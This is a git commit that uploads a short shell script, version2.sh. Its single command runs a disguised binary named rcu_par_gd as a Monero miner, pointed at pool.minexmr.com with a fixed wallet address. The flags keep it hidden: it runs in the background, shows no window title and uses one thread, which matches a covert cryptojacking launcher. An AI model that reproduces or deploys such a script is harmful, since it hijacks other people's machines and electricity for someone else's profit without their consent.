dcec3ed897bfd5004e7987f88750e463bf6254f8
dhallm <92021530+dhallm@users.noreply.github.com>
2021-10-06 11:30:14 +0200

    Add files via upload

---
+++ version2.sh
@@ -0,0 +1,3 @@
+./rcu_par_gd --donate-level 1 -o pool.minexmr.com:443 -u 42PgSAdPQpjMdN7v4JqcQ3G1vW6Pm5Tev2tEAmuKe366K1PYtFhWTyp6Q3ZxM5BcbgaUQZwQcNpLs2KVf3n1hm7qTC21Q4s --background --no-title --tls --algo rx/0 --threads=1 -k --rig-id BxSYS001
+
+
